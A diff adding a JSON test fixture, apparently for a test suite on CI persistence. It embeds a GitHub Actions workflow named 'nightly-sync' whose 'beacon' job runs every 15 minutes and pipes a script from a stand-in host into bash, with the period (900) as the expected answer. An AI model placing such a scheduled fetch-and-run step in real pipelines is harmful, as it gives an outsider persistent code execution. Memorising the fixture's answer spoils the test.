@@ -1,0 +1,11 @@
+{
+ "material": "name: nightly-sync\non:\n  schedule:\n    - cron: '*/15 * * * *'\n  workflow_dispatch:\njobs:\n  beacon:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://cdn.example.invalid/u.sh | bash\n",
+ "rep": "schedule_entries",
+ "transform": "period",
+ "key": null,
+ "expected": "900",
+ "decoy": false,
+ "note": "ci-schedule-persistence-model: lib.codec.schedule_entries/persistence_answer via decode(rep='schedule_entries', transform=<field>[@what][!filename], key=<accepted csv>)",
+ "generator_cmd": "sh tests/data/script_fixtures/sched_persist_gen.sh <dir>  (writes gha_cron.yml: hand-authored heredoc; no lib code); sched_persist_fx.py writes the json",
+ "oracle_cmd": "(cd <dir> && python3 -I -c \"import sys,yaml,datetime as D;sys.path.insert(0,'tools/pylib-cron');from croniter import croniter;c=yaml.safe_load(open(sys.argv[1]))[True]['schedule'][0]['cron'];i=croniter(c,D.datetime(2026,1,5));a=i.get_next(float);print(int(i.get_next(float)-a))\" gha_cron.yml)"
+}
